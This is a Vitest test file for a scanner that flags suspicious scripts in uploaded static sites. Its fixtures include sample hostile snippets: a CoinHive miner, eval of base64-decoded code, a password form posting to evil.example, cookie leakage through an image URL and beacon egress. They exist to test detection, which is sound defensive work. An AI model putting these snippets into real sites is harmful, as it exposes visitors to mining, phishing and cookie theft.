import { describe, expect, it } from 'vitest'
import { scanSite, scanText } from '@/server/uploads/content-scan'

const rules = (path: string, text: string) => scanText(path, text).map((f) => `${f.severity}:${f.rule}`)

describe('suspicious-script check (heuristic content scan)', () => {
  it('a normal static site produces no findings', () => {
    const html = `<!doctype html><html><head><link rel="stylesheet" href="style.css"><script src="app.js"></script>
      <script>document.querySelector('#y').textContent = new Date().getFullYear()</script></head>
      <body><form action="/search"><input name="q"></form><a href="https://example.com">link</a>
      <img src="https://cdn.example.com/a.png"><iframe src="map.html"></iframe></body></html>`
    expect(scanSite([
      { path: 'index.html', text: html },
      { path: 'app.js', text: 'const el = document.getElementById("x"); fetch("/data.json").then(r => r.json())' },
      { path: 'style.css', text: 'body{background:url(img/bg.png)}' },
      { path: 'logo.svg', text: '<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>' },
    ])).toEqual([])
  })

  it.each([
    ['crypto miner', 'app.js', 'var miner = new CoinHive.Anonymous("key"); miner.start()', 'high:crypto-miner'],
    ['obfuscated eval', 'app.js', 'eval(atob("YWxlcnQoMSk="))', 'high:obfuscated-exec'],
    ['Function + fromCharCode', 'index.html', '<script>Function(String.fromCharCode(97,108))()</script>', 'high:obfuscated-exec'],
    ['packer', 'app.js', "eval(function(p,a,c,k,e,d){return p}('x',1,1,'',0,{}))", 'high:packed-exec'],
    ['script from IP', 'index.html', '<script src="http://203.0.113.7/x.js"></script>', 'high:script-from-ip'],
    ['phishing form', 'index.html', '<form action="https://evil.example/collect"><input type="password" name="p"></form>', 'high:password-form-external'],
  ])('blocks %s', (_n, path, text, expected) => {
    expect(rules(path, text)).toContain(expected)
  })

  it.each([
    ['external script', 'index.html', '<script src="https://cdn.example.com/lib.js"></script>', 'medium:external-script'],
    ['protocol-relative script', 'index.html', '<script src="//cdn.example.com/lib.js"></script>', 'medium:external-script'],
    ['eval', 'app.js', 'eval(code)', 'medium:dynamic-code'],
    ['new Function', 'app.js', 'const f = new Function("a", body)', 'medium:dynamic-code'],
    ['external form', 'index.html', '<form action="https://forms.example.com/x"><input name="q"></form>', 'medium:external-form'],
    ['meta refresh', 'index.html', '<meta http-equiv="refresh" content="0; url=https://elsewhere.example">', 'medium:external-redirect'],
    ['location redirect', 'app.js', 'window.location.href = "https://elsewhere.example"', 'medium:external-redirect'],
    ['external iframe', 'index.html', '<iframe src="https://other.example/page"></iframe>', 'medium:external-frame'],
    ['cookie access', 'app.js', 'new Image().src = "/t?c=" + document.cookie', 'medium:cookie-access'],
    ['svg script', 'logo.svg', '<svg><script>alert(1)</script></svg>', 'medium:svg-script'],
    ['svg handler', 'logo.svg', '<svg onload="alert(1)"></svg>', 'medium:svg-script'],
    ['hex blob', 'app.js', 'var s = "' + String.raw`\x41`.repeat(60) + '"', 'medium:obfuscated-strings'],
    ['css javascript url', 'style.css', 'a{background:url("javascript:alert(1)")}', 'medium:css-script'],
    ['window.open', 'app.js', 'window.open(dest + "?d=" + data)', 'medium:window-open'],
    ['WebRTC', 'app.js', 'const pc = new RTCPeerConnection({ iceServers: [{ urls: s }] })', 'medium:webrtc'],
    ['data channel', 'index.html', '<script>pc.createDataChannel("x"); let c = RTCDataChannel</script>', 'medium:webrtc'],
    ['runtime-built redirect', 'app.js', 'location.href = base + "?d=" + encodeURIComponent(x)', 'medium:dynamic-redirect'],
    ['window.location = var', 'app.js', 'window.location = target', 'medium:dynamic-redirect'],
    ['location.assign(var)', 'index.html', '<script>location.assign(url)</script>', 'medium:dynamic-redirect'],
    ['location.replace(fn)', 'app.js', 'location.replace(build(x))', 'medium:dynamic-redirect'],
  ])('warns about %s', (_n, path, text, expected) => {
    expect(rules(path, text)).toContain(expected)
  })

  it('ordinary navigation code is not flagged as a runtime-built redirect', () => {
    for (const code of [
      'if (location.href === prev) go()',
      'if (window.location == x) y()',
      'location.hash = "#top"',
      'window.location = "/reports"',
      'location.assign("/next")',
      'location.reload()',
      'const href = location.href',
    ]) {
      expect(rules('app.js', code), code).not.toContain('medium:dynamic-redirect')
    }
  })

  it('the user-supplied egress canary page: CSP-blocked channels only, so no static findings', () => {
    // fetch / sendBeacon / Image to a typed-in URL are blocked at runtime by connect-src/img-src 'self' (verified).
    const page = `<script>const r=await fetch(url.href,{method:'POST'});navigator.sendBeacon(url.href,b);const img=new Image();img.src=url.href</script>`
    expect(scanText('index.html', page)).toEqual([])
  })

  it('a HIGH finding is not repeated as the matching MEDIUM one', () => {
    expect(rules('index.html', '<script src="http://203.0.113.7/x.js"></script>')).toEqual(['high:script-from-ip'])
    expect(rules('index.html', '<form action="https://evil.example/c"><input type="password"></form>')).toEqual(['high:password-form-external'])
  })

  it('reports file and line, ignores non-text files, and caps results', () => {
    const [f] = scanText('js/app.js', 'ok()\nok()\neval(atob("eA=="))')
    expect(f).toMatchObject({ path: 'js/app.js', line: 3, severity: 'high' })
    expect(scanText('img.png', 'eval(atob("x"))')).toEqual([])
    const many = Array.from({ length: 40 }, (_, i) => ({ path: `p${i}.js`, text: 'eval(x); eval(y)' }))
    expect(scanSite(many).length).toBe(50)
  })

  it('HIGH findings are listed first', () => {
    const out = scanSite([{ path: 'a.js', text: 'eval(x)' }, { path: 'b.js', text: 'eval(atob("x"))' }])
    expect(out[0]!.severity).toBe('high')
  })

  it('stays fast on large adversarial input (no catastrophic backtracking)', () => {
    const big = '<form action="' + 'a'.repeat(400_000) + '<script src=' + ' '.repeat(200_000) + 'eval  ('.repeat(20_000)
    const t = performance.now()
    scanText('index.html', big)
    expect(performance.now() - t).toBeLessThan(2000)
  })
})
